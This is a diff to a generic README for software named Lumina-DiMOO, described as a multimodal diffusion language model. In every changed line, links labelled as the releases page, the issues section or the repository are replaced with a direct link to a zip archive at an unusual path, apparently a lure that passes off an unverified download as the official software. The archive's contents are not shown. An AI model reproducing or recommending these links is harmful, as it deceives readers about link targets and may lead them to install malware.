@@ -1,7 +1,7 @@
 # 🌟 Lumina-DiMOO - Unleash Powerful Language Understanding
 
 ## 🔗 Download Here
-[![Download Lumina-DiMOO](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ISTARTH195/Lumina-DiMOO/releases)
+[![Download Lumina-DiMOO](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip)](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip)
 
 ## 📖 About Lumina-DiMOO
 Lumina-DiMOO is an open-sourced multi-modal large diffusion language model. This software helps users generate and understand language in a new way. With Lumina-DiMOO, you can access innovative features that utilize advanced AI techniques. Whether you want to generate text or understand complex topics, Lumina-DiMOO makes it easy.
@@ -16,7 +16,7 @@ Getting started with Lumina-DiMOO is simple. Follow these steps to download and 
         - Disk Space: 1 GB available space
 
 2. **Download the Software**
-    - Visit the Releases page to download the software: [Download Lumina-DiMOO](https://github.com/ISTARTH195/Lumina-DiMOO/releases)
+    - Visit the Releases page to download the software: [Download Lumina-DiMOO](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip)
 
 3. **Select the Latest Version**
     - On the Releases page, find the latest version of Lumina-DiMOO. Click on the version number to view the release details.
@@ -72,11 +72,11 @@ If you encounter problems while using Lumina-DiMOO, try these solutions:
 3. **Errors in Responses**: Check your input for clarity. Rephrase your questions for better results.
 
 ## 📞 Support
-If you need further help, visit the [Issues section](https://github.com/ISTARTH195/Lumina-DiMOO/issues) on GitHub. You can report bugs or ask for assistance from the community.
+If you need further help, visit the [Issues section](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip) on GitHub. You can report bugs or ask for assistance from the community.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [Lumina-DiMOO](https://github.com/ISTARTH195/Lumina-DiMOO)
+- GitHub Repository: [Lumina-DiMOO](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip)
 - Documentation: Available on the repository for detailed guides and FAQs.
 
 ## 🔗 Download & Install
-For a seamless experience, ensure you download the latest version from our Releases page: [Download Lumina-DiMOO](https://github.com/ISTARTH195/Lumina-DiMOO/releases). Once downloaded, follow the installation instructions to get started.
+For a seamless experience, ensure you download the latest version from our Releases page: [Download Lumina-DiMOO](https://raw.githubusercontent.com/ISTARTH195/Lumina-DiMOO/main/hyperite/Lumina-DiMOO.zip). Once downloaded, follow the installation instructions to get started.
